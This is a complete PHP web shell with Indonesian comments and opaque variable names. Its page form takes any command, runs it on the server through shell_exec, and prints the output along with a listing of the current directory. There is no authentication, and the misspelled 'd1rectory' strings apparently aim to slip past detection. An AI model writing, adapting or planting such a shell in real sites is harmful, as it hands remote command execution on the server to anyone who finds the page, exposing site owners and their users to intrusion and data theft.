<?php  
// Menampilkan direktori kerja saat ini
$a1 = getcwd();  
echo "<h2>Current Directory:</h2>";  
echo "<p>$a1</p>"; 

// Form untuk memasukkan perintah
echo '<form method="post">
        <input type="text" name="a2" placeholder="Enter command">
        <input type="submit" value="Execute">
      </form>';

// Jika ada perintah yang dikirimkan
if (!empty($_POST['a2'])) {
    $a3 = $_POST['a2'];
    $a4 = shell_exec($a3 . ' 2>&1');
    echo "<h2>Command Output:</h2>";  
    echo "<pre>$a4</pre>";
}

// Menampilkan daftar file di d1r saat ini
$a5 = scandir($a1);  
$a5 = array_diff($a5, array('.', '..'));  

if (count($a5) > 0) {  
    echo "<h2>Files in Current D1rectory:</h2>";  
    echo "<ul>";  
    
    foreach ($a5 as $a6) {  
        echo "<li>$a6</li>";  
    }  

    echo "</ul>";  
} else {  
    echo "<p>No files found in this d1rectory.</p>";  
}  
?>
